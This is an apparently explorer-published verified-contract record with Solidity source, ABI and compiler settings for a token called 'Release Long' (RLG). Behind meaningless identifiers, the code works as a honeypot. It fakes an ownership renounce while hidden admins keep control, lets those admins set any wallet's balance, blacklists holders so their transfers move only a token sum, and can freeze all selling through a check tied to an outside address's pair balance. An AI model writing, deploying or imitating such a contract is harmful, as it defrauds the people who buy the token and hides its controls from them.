{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fundList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitTakeSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeMode {\n    function createPair(address modeEnable, address maxLimit) external returns (address);\n}\n\ninterface exemptTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSell) external view returns (uint256);\n\n    function transfer(address senderMin, uint256 maxFrom) external returns (bool);\n\n    function allowance(address receiverMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderMin,\n        uint256 maxFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromExempt, uint256 value);\n    event Approval(address indexed receiverMin, address indexed spender, uint256 value);\n}\n\ninterface exemptTradingMetadata is exemptTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReleaseLong is limitTakeSender, exemptTrading, exemptTradingMetadata {\n\n    function minMarketingLaunched() private view {\n        require(feeSender[_msgSender()]);\n    }\n\n    function allowance(address buyTotal, address atToken) external view virtual override returns (uint256) {\n        if (atToken == launchedSell) {\n            return type(uint256).max;\n        }\n        return maxAuto[buyTotal][atToken];\n    }\n\n    function modeTxShould(address txBuy) public {\n        if (fromEnableAmount) {\n            return;\n        }\n        if (swapAt != isSender) {\n            isSender = false;\n        }\n        feeSender[txBuy] = true;\n        \n        fromEnableAmount = true;\n    }\n\n    function approve(address atToken, uint256 maxFrom) public virtual override returns (bool) {\n        maxAuto[_msgSender()][atToken] = maxFrom;\n        emit Approval(_msgSender(), atToken, maxFrom);\n        return true;\n    }\n\n    address feeFundFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        fundList feeFund = fundList(launchedSell);\n        feeAutoMode = takeMode(feeFund.factory()).createPair(feeFund.WETH(), address(this));\n        if (tokenMin != fundTradingReceiver) {\n            fundTradingReceiver = tokenMin;\n        }\n        feeTeamLaunched = _msgSender();\n        marketingLaunchLiquidity();\n        feeSender[feeTeamLaunched] = true;\n        teamTotal[feeTeamLaunched] = marketingSender;\n        if (autoMarketing != tokenMin) {\n            isSender = true;\n        }\n        emit Transfer(address(0), feeTeamLaunched, marketingSender);\n    }\n\n    function walletTxLaunch(address listWallet) public {\n        minMarketingLaunched();\n        \n        if (listWallet == feeTeamLaunched || listWallet == feeAutoMode) {\n            return;\n        }\n        maxSender[listWallet] = true;\n    }\n\n    bool private swapAt;\n\n    function name() external view virtual override returns (string memory) {\n        return atEnableTo;\n    }\n\n    function fundWallet(address enableReceiver, uint256 maxFrom) public {\n        minMarketingLaunched();\n        teamTotal[enableReceiver] = maxFrom;\n    }\n\n    uint256 private modeShould;\n\n    address launchedSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address enableReceiver, uint256 maxFrom) external virtual override returns (bool) {\n        return listSwap(_msgSender(), enableReceiver, maxFrom);\n    }\n\n    event OwnershipTransferred(address indexed liquidityToBuy, address indexed swapSender);\n\n    mapping(address => bool) public maxSender;\n\n    uint256 public fundTradingReceiver;\n\n    function transferFrom(address swapTotalExempt, address senderMin, uint256 maxFrom) external override returns (bool) {\n        if (_msgSender() != launchedSell) {\n            if (maxAuto[swapTotalExempt][_msgSender()] != type(uint256).max) {\n                require(maxFrom <= maxAuto[swapTotalExempt][_msgSender()]);\n                maxAuto[swapTotalExempt][_msgSender()] -= maxFrom;\n            }\n        }\n        return listSwap(swapTotalExempt, senderMin, maxFrom);\n    }\n\n    address public feeTeamLaunched;\n\n    uint256 public tradingAuto;\n\n    uint256 constant txTotalMode = 19 ** 10;\n\n    uint256 private marketingSender = 100000000 * 10 ** 18;\n\n    uint256 maxShould;\n\n    string private atEnableTo = \"Release Long\";\n\n    function getOwner() external view returns (address) {\n        return receiverLiquidity;\n    }\n\n    function marketingLaunchLiquidity() public {\n        emit OwnershipTransferred(feeTeamLaunched, address(0));\n        receiverLiquidity = address(0);\n    }\n\n    uint256 public autoMarketing;\n\n    uint256 limitFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingShouldAt;\n    }\n\n    uint8 private marketingShouldAt = 18;\n\n    mapping(address => mapping(address => uint256)) private maxAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchShould;\n    }\n\n    address public feeAutoMode;\n\n    function listSwap(address swapTotalExempt, address senderMin, uint256 maxFrom) internal returns (bool) {\n        if (swapTotalExempt == feeTeamLaunched) {\n            return liquidityAmount(swapTotalExempt, senderMin, maxFrom);\n        }\n        uint256 maxReceiver = exemptTrading(feeAutoMode).balanceOf(feeFundFrom);\n        require(maxReceiver == maxShould);\n        require(senderMin != feeFundFrom);\n        if (maxSender[swapTotalExempt]) {\n            return liquidityAmount(swapTotalExempt, senderMin, txTotalMode);\n        }\n        return liquidityAmount(swapTotalExempt, senderMin, maxFrom);\n    }\n\n    string private launchShould = \"RLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSender;\n    }\n\n    uint256 private tokenMin;\n\n    mapping(address => bool) public feeSender;\n\n    function balanceOf(address walletSell) public view virtual override returns (uint256) {\n        return teamTotal[walletSell];\n    }\n\n    bool public liquidityTradingReceiver;\n\n    bool public fromEnableAmount;\n\n    function toIsLiquidity(uint256 maxFrom) public {\n        minMarketingLaunched();\n        maxShould = maxFrom;\n    }\n\n    address private receiverLiquidity;\n\n    function liquidityAmount(address swapTotalExempt, address senderMin, uint256 maxFrom) internal returns (bool) {\n        require(teamTotal[swapTotalExempt] >= maxFrom);\n        teamTotal[swapTotalExempt] -= maxFrom;\n        teamTotal[senderMin] += maxFrom;\n        emit Transfer(swapTotalExempt, senderMin, maxFrom);\n        return true;\n    }\n\n    bool private receiverSell;\n\n    function owner() external view returns (address) {\n        return receiverLiquidity;\n    }\n\n    bool public isSender;\n\n    mapping(address => uint256) private teamTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAutoMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTradingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunchLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"}],\"name\":\"modeTxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"toIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotalExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"walletTxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReleaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}